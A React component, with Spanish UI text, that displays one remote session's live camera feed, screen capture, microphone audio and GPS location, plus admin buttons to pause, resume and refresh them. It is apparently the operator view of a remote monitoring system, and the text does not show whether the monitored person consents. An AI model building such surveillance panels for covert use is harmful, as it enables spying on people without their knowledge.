'use client';

import { useEffect, useState, useRef } from 'react';
import { useWebSocket } from '@/contexts/WebSocketContext';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { 
  Camera, 
  Monitor, 
  Mic, 
  MapPin, 
  Play, 
  Pause, 
  Volume2, 
  VolumeX,
  Maximize2,
  RefreshCw
} from 'lucide-react';

interface StreamViewerProps {
  sessionId: string;
}

interface LocationData {
  latitude: number;
  longitude: number;
  accuracy?: number;
  timestamp: number;
}

export default function StreamViewer({ sessionId }: StreamViewerProps) {
  const { socket, connected, sendCommand } = useWebSocket();
  
  // Canvas refs para frames
  const cameraCanvasRef = useRef<HTMLCanvasElement>(null);
  const screenCanvasRef = useRef<HTMLCanvasElement>(null);
  
  // Audio
  const [audioEnabled, setAudioEnabled] = useState(true);
  const audioContextRef = useRef<AudioContext | null>(null);
  const audioQueueRef = useRef<Uint8Array[]>([]);
  const isPlayingAudioRef = useRef(false);

  // Location
  const [location, setLocation] = useState<LocationData | null>(null);

  // Stream stats
  const [stats, setStats] = useState({
    cameraFrames: 0,
    screenFrames: 0,
    audioChunks: 0,
    locationUpdates: 0,
    lastUpdate: Date.now(),
  });

  useEffect(() => {
    if (!socket || !connected) return;

    console.log(`🎥 StreamViewer iniciado para sesión: ${sessionId}`);

    // Initialize audio context
    if (!audioContextRef.current) {
      audioContextRef.current = new (window.AudioContext || (window as any).webkitAudioContext)();
    }

    // ============ Event Listeners ============

    const handleCameraFrame = (data: { sessionId: string; frame: string; timestamp: number }) => {
      if (data.sessionId !== sessionId) return;

      const canvas = cameraCanvasRef.current;
      if (!canvas) return;

      const ctx = canvas.getContext('2d');
      if (!ctx) return;

      const img = new Image();
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
      };
      img.src = `data:image/jpeg;base64,${data.frame}`;

      setStats(prev => ({ ...prev, cameraFrames: prev.cameraFrames + 1, lastUpdate: Date.now() }));
    };

    const handleScreenFrame = (data: { sessionId: string; frame: string; timestamp: number }) => {
      if (data.sessionId !== sessionId) return;

      const canvas = screenCanvasRef.current;
      if (!canvas) return;

      const ctx = canvas.getContext('2d');
      if (!ctx) return;

      const img = new Image();
      img.onload = () => {
        canvas.width = img.width;
        canvas.height = img.height;
        ctx.drawImage(img, 0, 0);
      };
      img.src = `data:image/jpeg;base64,${data.frame}`;

      setStats(prev => ({ ...prev, screenFrames: prev.screenFrames + 1, lastUpdate: Date.now() }));
    };

    const handleAudioChunk = async (data: { sessionId: string; chunk: string; timestamp: number }) => {
      if (data.sessionId !== sessionId || !audioEnabled) return;

      try {
        // Decode base64 to ArrayBuffer
        const binaryString = atob(data.chunk);
        const bytes = new Uint8Array(binaryString.length);
        for (let i = 0; i < binaryString.length; i++) {
          bytes[i] = binaryString.charCodeAt(i);
        }

        audioQueueRef.current.push(bytes);
        setStats(prev => ({ ...prev, audioChunks: prev.audioChunks + 1, lastUpdate: Date.now() }));

        // Play audio queue
        if (!isPlayingAudioRef.current) {
          playAudioQueue();
        }
      } catch (error) {
        console.error('Error processing audio chunk:', error);
      }
    };

    const handleGpsData = (data: { sessionId: string; latitude: number; longitude: number; accuracy?: number; timestamp: number }) => {
      if (data.sessionId !== sessionId) return;

      setLocation({
        latitude: data.latitude,
        longitude: data.longitude,
        accuracy: data.accuracy,
        timestamp: data.timestamp,
      });

      setStats(prev => ({ ...prev, locationUpdates: prev.locationUpdates + 1, lastUpdate: Date.now() }));
    };

    // Register event listeners
    socket.on('camera-frame', handleCameraFrame);
    socket.on('screen-frame', handleScreenFrame);
    socket.on('audio-chunk', handleAudioChunk);
    socket.on('gps-data', handleGpsData);

    // Cleanup
    return () => {
      socket.off('camera-frame', handleCameraFrame);
      socket.off('screen-frame', handleScreenFrame);
      socket.off('audio-chunk', handleAudioChunk);
      socket.off('gps-data', handleGpsData);
    };
  }, [socket, connected, sessionId, audioEnabled]);

  const playAudioQueue = async () => {
    if (!audioContextRef.current || audioQueueRef.current.length === 0) {
      isPlayingAudioRef.current = false;
      return;
    }

    isPlayingAudioRef.current = true;
    const chunk = audioQueueRef.current.shift();

    if (chunk) {
      try {
        // Create a proper ArrayBuffer from Uint8Array
        const arrayBuffer = chunk.buffer.slice(0) as ArrayBuffer;
        const audioBuffer = await audioContextRef.current.decodeAudioData(arrayBuffer);
        const source = audioContextRef.current.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioContextRef.current.destination);
        source.start();

        source.onended = () => {
          playAudioQueue();
        };
      } catch (error) {
        console.error('Error playing audio:', error);
        isPlayingAudioRef.current = false;
      }
    }
  };

  const toggleAudio = () => {
    setAudioEnabled(prev => !prev);
    if (!audioEnabled) {
      audioQueueRef.current = [];
      isPlayingAudioRef.current = false;
    }
  };

  const openGoogleMaps = () => {
    if (location) {
      window.open(
        `https://www.google.com/maps?q=${location.latitude},${location.longitude}`,
        '_blank'
      );
    }
  };

  const handleCommand = (command: string) => {
    sendCommand(sessionId, command);
    console.log(`📡 Comando enviado: ${command}`);
  };

  if (!connected) {
    return (
      <Card className="bg-muted border-border">
        <CardContent className="p-8 text-center">
          <RefreshCw className="w-12 h-12 text-muted-foreground mx-auto mb-4 animate-spin" />
          <p className="text-muted-foreground">Conectando al WebSocket...</p>
        </CardContent>
      </Card>
    );
  }

  return (
    <div className="space-y-4">
      {/* Stats Bar */}
      <Card className="bg-muted border-border">
        <CardContent className="p-4">
          <div className="flex items-center justify-between text-sm">
            <div className="flex gap-6">
              <div className="flex items-center gap-2">
                <Camera className="w-4 h-4 text-blue-400" />
                <span className="text-muted-foreground">Cámara:</span>
                <span className="text-foreground font-mono">{stats.cameraFrames}</span>
              </div>
              <div className="flex items-center gap-2">
                <Monitor className="w-4 h-4 text-primary" />
                <span className="text-muted-foreground">Pantalla:</span>
                <span className="text-foreground font-mono">{stats.screenFrames}</span>
              </div>
              <div className="flex items-center gap-2">
                <Mic className="w-4 h-4 text-green-400" />
                <span className="text-muted-foreground">Audio:</span>
                <span className="text-foreground font-mono">{stats.audioChunks}</span>
              </div>
              <div className="flex items-center gap-2">
                <MapPin className="w-4 h-4 text-red-400" />
                <span className="text-muted-foreground">GPS:</span>
                <span className="text-foreground font-mono">{stats.locationUpdates}</span>
              </div>
            </div>
            <Button size="sm" variant="ghost" onClick={toggleAudio}>
              {audioEnabled ? (
                <Volume2 className="w-4 h-4 text-green-400" />
              ) : (
                <VolumeX className="w-4 h-4 text-red-400" />
              )}
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Streams Grid */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Camera Stream */}
        <Card className="bg-muted border-border">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <Camera className="w-4 h-4 text-blue-400" />
              Cámara en Vivo
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="relative bg-background rounded-lg overflow-hidden aspect-video">
              <canvas
                ref={cameraCanvasRef}
                className="w-full h-full object-contain"
              />
              {stats.cameraFrames === 0 && (
                <div className="absolute inset-0 flex items-center justify-center">
                  <p className="text-muted-foreground text-sm">Esperando stream de cámara...</p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>

        {/* Screen Stream */}
        <Card className="bg-muted border-border">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <Monitor className="w-4 h-4 text-primary" />
              Pantalla en Vivo
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="relative bg-background rounded-lg overflow-hidden aspect-video">
              <canvas
                ref={screenCanvasRef}
                className="w-full h-full object-contain"
              />
              {stats.screenFrames === 0 && (
                <div className="absolute inset-0 flex items-center justify-center">
                  <p className="text-muted-foreground text-sm">Esperando stream de pantalla...</p>
                </div>
              )}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Location */}
      {location && (
        <Card className="bg-muted border-border">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm flex items-center gap-2">
              <MapPin className="w-4 h-4 text-red-400" />
              Ubicación GPS
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="flex items-center justify-between">
              <div className="space-y-1 text-sm">
                <p className="text-muted-foreground">
                  Lat: <span className="text-foreground font-mono">{location.latitude.toFixed(6)}</span>
                </p>
                <p className="text-muted-foreground">
                  Lng: <span className="text-foreground font-mono">{location.longitude.toFixed(6)}</span>
                </p>
                {location.accuracy && (
                  <p className="text-muted-foreground">
                    Precisión: <span className="text-foreground">{location.accuracy.toFixed(0)}m</span>
                  </p>
                )}
              </div>
              <Button onClick={openGoogleMaps} variant="outline">
                <Maximize2 className="w-4 h-4 mr-2" />
                Ver en Maps
              </Button>
            </div>
          </CardContent>
        </Card>
      )}

      {/* Admin Commands */}
      <Card className="bg-muted border-border">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm">Comandos de Control</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex gap-2 flex-wrap">
            <Button
              size="sm"
              variant="outline"
              onClick={() => handleCommand('pause-camera')}
            >
              <Pause className="w-4 h-4 mr-1" />
              Pausar Cámara
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => handleCommand('resume-camera')}
            >
              <Play className="w-4 h-4 mr-1" />
              Reanudar Cámara
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => handleCommand('pause-screen')}
            >
              <Pause className="w-4 h-4 mr-1" />
              Pausar Pantalla
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => handleCommand('resume-screen')}
            >
              <Play className="w-4 h-4 mr-1" />
              Reanudar Pantalla
            </Button>
            <Button
              size="sm"
              variant="outline"
              onClick={() => handleCommand('refresh-location')}
            >
              <RefreshCw className="w-4 h-4 mr-1" />
              Actualizar GPS
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
